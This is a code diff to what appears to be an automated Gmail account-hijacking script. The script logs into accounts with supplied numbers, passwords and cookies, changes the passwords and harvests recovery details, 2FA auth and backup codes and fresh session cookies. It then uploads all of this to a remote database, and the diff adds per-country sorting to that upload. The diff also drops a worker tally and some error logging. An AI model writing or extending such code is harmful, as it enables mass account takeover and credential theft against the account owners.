@@ -57,7 +57,7 @@ async function startServer() {
                 mSameNumber = 0
             }
             console.log('Process: [ Receive New Data --- Time: '+getTime()+' ]')
-            await loginWithCompleted(data.number, data.password, data.cookies, data.time?data.time:data.create, data.key)
+            await loginWithCompleted(data.number, data.password, data.cookies, data.time?data.time:data.create, data.key, data.country)
             prevNumber = data.number
             try {
                 process.send({ t:9, s:false })
@@ -68,9 +68,9 @@ async function startServer() {
     }
 }
 
-async function loginWithCompleted(number, password, cookiesData, time, worker) {
+async function loginWithCompleted(number, password, cookiesData, time, worker, country) {
     let cookies = cookiesData
-    
+
     try {
         let raptToken = null
         let index = cookiesData.indexOf('||')
@@ -169,27 +169,13 @@ async function loginWithCompleted(number, password, cookiesData, time, worker) {
                             let n_cookies = await changer.getNewCookies(await page.cookies())
                             
                             try {
-                                await axios.patch(DATABASE_URL+'gmail/completed'+(mTwoFa.error ? '_error':(mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, n_cookies:n_cookies, create: mYear, mail:mMailYear, auth:mTwoFa.auth, backup:mTwoFa.backup }), {
+                                await axios.patch(DATABASE_URL+'gmail/'+(country?country+'/':'')+'completed'+(mTwoFa.error ? '_error':(mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, n_cookies:n_cookies, create: mYear, mail:mMailYear, auth:mTwoFa.auth, backup:mTwoFa.backup }), {
                                     headers: {
                                         'Content-Type': 'application/x-www-form-urlencoded'
                                     }
                                 })
                             } catch (error) {
-                                console.log(error)
                                 console.log('Process: [ File Save: Error --- Time: '+getTime()+' ]')
-                            }
-
-                            if (worker) {
-                                try {
-                                    await axios.patch(BASE_URL+'extra/'+worker+'.json', '{"'+number+'":"1"}', {
-                                        headers: {
-                                            'Content-Type': 'application/x-www-form-urlencoded'
-                                        }
-                                    })
-                                } catch (error) {
-                                    console.log(error)
-                                    console.log('Process: [ File Save: Error --- Time: '+getTime()+' ]')
-                                }
                             }
             
                             console.log('Process: [ New Password: '+mPassword+' --- Time: '+getTime()+' ]')
@@ -213,7 +199,6 @@ async function loginWithCompleted(number, password, cookiesData, time, worker) {
                                     }
                                 })
                             } catch (error) {
-                                console.log(error)
                                 console.log('Process: [ File Save: Error --- Time: '+getTime()+' ]')
                             }
                             
@@ -229,7 +214,6 @@ async function loginWithCompleted(number, password, cookiesData, time, worker) {
                                 }
                             })
                         } catch (error) {
-                            console.log(error)
                             console.log('Process: [ File Save: Error --- Time: '+getTime()+' ]')
                         }
                         
@@ -247,7 +231,6 @@ async function loginWithCompleted(number, password, cookiesData, time, worker) {
                             }
                         })
                     } catch (error) {
-                        console.log(error)
                         console.log('Process: [ File Save: Error --- Time: '+getTime()+' ]')
                     }
                 }
@@ -256,7 +239,6 @@ async function loginWithCompleted(number, password, cookiesData, time, worker) {
                     await axios.delete(BASE_URL+FILE_NAME+'/'+number+'.json')
                 } catch (error) {}
             } catch (error) {
-                console.log(error)
                 console.log('Process: [ Browser Process: Error --- Time: '+getTime()+' ]')
             }
             
@@ -272,7 +254,6 @@ async function loginWithCompleted(number, password, cookiesData, time, worker) {
                     }
                 })
             } catch (error) {
-                console.log(error)
                 console.log('Process: [ File Save: Error --- Time: '+getTime()+' ]')
             }
 
@@ -291,7 +272,6 @@ async function loginWithCompleted(number, password, cookiesData, time, worker) {
                     }
                 })
             } catch (error) {
-                console.log(error)
                 console.log('Process: [ File Save: Error --- Time: '+getTime()+' ]')
             }
             console.log('Process: [ Coocies Delete: '+number+' --- Time: '+getTime()+' ]')
